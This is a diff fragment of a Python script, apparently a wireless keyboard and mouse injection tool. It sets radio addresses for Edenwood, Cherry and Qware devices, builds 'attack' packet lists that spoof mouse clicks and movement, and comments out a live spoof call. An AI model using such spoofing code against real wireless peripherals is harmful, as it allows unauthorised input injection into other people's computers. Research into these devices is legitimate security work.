@@ -130,8 +130,8 @@ attack_rapoo_mouse = [
 ----------------------------Edenwood----------------------------
 """
 
-edenwood_mouse = Edenwood_Mouse("55:2d:2c:bc", 0x11021, 0x6818)
-edenwood_keyboard = Edenwood_Keyboard("55:2d:2c:bc", 0x11021, 0x6818)
+edenwood_mouse = Edenwood_Mouse("55:2d:2c:bc:bc", 0x11021, 0x6818)
+edenwood_keyboard = Edenwood_Keyboard("55:2d:2c:bc:be", 0x11021, 0x6818)
 
 #edenwood_keyboard.sniff()
 #edenwood_mouse.sniff()
@@ -168,7 +168,7 @@ cherry_mouse = Cherry_Mouse("ac:da:da:96", 0x11021, 0x3c32)
 ----------------------------Qware----------------------------
 """
 
-qware_keyboard = Qware_Keyboard("3d:99:52:9c", 0x11021, 0xc5c5)
+qware_keyboard = Qware_Keyboard("3d:99:52:9c:12", 0x11021, 0xc5c5)
 qware_mouse= Qware_Mouse("3d:99:52:9c:11", 0x11021, 0x784e)
 
 #qware_keyboard.sniff()
@@ -188,4 +188,4 @@ attack_qware_keyboard = [
 attack_qware_mouse = [qware_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="fe0100ff01", scrolling_move="FF")]
 
 #qware_keyboard.spoof(attack_qware_keyboard)
-qware_mouse.spoof(attack_qware_mouse)
+#qware_mouse.spoof(attack_qware_mouse)
